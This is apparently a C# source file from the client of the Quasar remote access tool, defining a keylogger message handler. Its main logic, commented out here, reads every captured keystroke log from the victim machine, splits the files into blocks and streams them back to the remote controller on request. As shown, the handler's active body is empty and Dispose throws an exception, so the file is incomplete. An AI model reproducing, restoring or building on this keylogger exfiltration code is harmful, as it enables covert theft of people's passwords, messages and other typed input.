using Quasar.Client.Utilities;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;
using System.IO;
using System.Threading;
using Quasar.Common.IO;

namespace Quasar.Client.Messages
{
    public class KeyloggerHandler : MessageProcessorBase<object>
    {
        private Keylogger logger;

        public KeyloggerHandler() : base(false)
        {
            
        }

        public override bool CanExecute(IMessage message) => message is GetKeyloggerLogs;

        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetKeyloggerLogs msg:
                    Execute(sender, msg);
                    break;
            }
        }

        public void Execute(ISender client, GetKeyloggerLogs message)
        {
            /*new Thread(() =>
            {
                try
                {
                    int index = 1;

                    if (!Directory.Exists(Keylogger.LogDirectory))
                    {
                        client.Send(new GetKeyloggerLogsResponse
                        {
                            Filename = "",
                            Block = new byte[0],
                            MaxBlocks = -1,
                            CurrentBlock = -1,
                            CustomMessage = "",
                            Index = index,
                            FileCount = 0
                        });
                        return;
                    }

                    FileInfo[] iFiles = new DirectoryInfo(Keylogger.LogDirectory).GetFiles();

                    if (iFiles.Length == 0)
                    {
                        client.Send(new GetKeyloggerLogsResponse
                        {
                            Filename = "",
                            Block = new byte[0],
                            MaxBlocks = -1,
                            CurrentBlock = -1,
                            CustomMessage = "",
                            Index = index,
                            FileCount = 0
                        });
                        return;
                    }

                    foreach (FileInfo file in iFiles)
                    {
                        var srcFile = new FileSplitLegacy(file.FullName);

                        if (srcFile.MaxBlocks < 0)
                        {
                            client.Send(new GetKeyloggerLogsResponse
                            {
                                Filename = "",
                                Block = new byte[0],
                                MaxBlocks = -1,
                                CurrentBlock = -1,
                                CustomMessage = srcFile.LastError,
                                Index = index,
                                FileCount = iFiles.Length
                            });
                        }

                        for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                        {
                            byte[] block;
                            if (srcFile.ReadBlock(currentBlock, out block))
                            {
                                client.Send(new GetKeyloggerLogsResponse
                                {
                                    Filename = Path.GetFileName(file.Name),
                                    Block = block,
                                    MaxBlocks = srcFile.MaxBlocks,
                                    CurrentBlock = currentBlock,
                                    CustomMessage = srcFile.LastError,
                                    Index = index,
                                    FileCount = iFiles.Length
                                });
                                //Thread.Sleep(200);
                            }
                            else
                            {
                                client.Send(new GetKeyloggerLogsResponse
                                {
                                    Filename = "",
                                    Block = new byte[0],
                                    MaxBlocks = -1,
                                    CurrentBlock = -1,
                                    CustomMessage = srcFile.LastError,
                                    Index = index,
                                    FileCount = iFiles.Length
                                });
                            }
                        }

                        index++;
                    }
                }
                catch (Exception ex)
                {
                    client.Send(new GetKeyloggerLogsResponse
                    {
                        Filename = "",
                        Block = new byte[0],
                        MaxBlocks = -1,
                        CurrentBlock = -1,
                        CustomMessage = ex.Message,
                        Index = -1,
                        FileCount = -1
                    });
                }
            }).Start();*/
        }

        protected override void Dispose(bool disposing)
        {
            throw new NotImplementedException();
        }
    }
}
